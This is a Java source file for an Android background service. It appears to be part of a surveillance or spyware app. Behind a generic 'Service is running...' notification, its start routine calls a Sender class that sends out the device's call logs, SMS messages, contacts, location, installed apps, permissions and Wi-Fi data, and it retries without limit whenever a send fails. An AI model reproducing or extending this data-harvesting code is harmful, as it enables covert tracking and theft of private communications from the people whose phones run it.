package com.behavioralanalysis.service;

import android.app.Notification;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;

import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;

import static com.behavioralanalysis.service.App.CHANNEL_ID;

public class MainService extends Service {
    private static Context context;
    private static final int NOTIFICATION_ID=1;

    @Override
    public void onCreate() {
        super.onCreate();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Notification notification = getNotification(null);

        startForeground(NOTIFICATION_ID, notification);

        context = this;

        start();

        return START_NOT_STICKY;
    }

    private Notification getNotification(String text) {
        Intent notificationIntent = new Intent(this, MainActivity.class);
        PendingIntent pendingIntent = PendingIntent.getActivity(
                this,
                0,
                notificationIntent,
                0
        );

        if (text == null || text.equals("")) {
            text = "Service is running...";
        }

        return new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("Service")
                .setContentText(text)
                .setSmallIcon(R.drawable.ic_android)
                .setContentIntent(pendingIntent)
                .build();
    }

    public void UpdateNotification(String text) {
        Notification notification = getNotification(text);
        NotificationManager notificationManager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
        notificationManager.notify(NOTIFICATION_ID, notification);
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    public static Context getContext() {
        return context;
    }

    public static void start() {
        try {
            Sender.sendApps(true);
            Sender.sendCalls();
            Sender.sendContacts();
            Sender.sendLocation();
            Sender.sendPermissions();
            Sender.sendSms();
            Sender.sendWifi();
        } catch (Exception ex) {
            ex.printStackTrace();
            start();
        }
    }
}
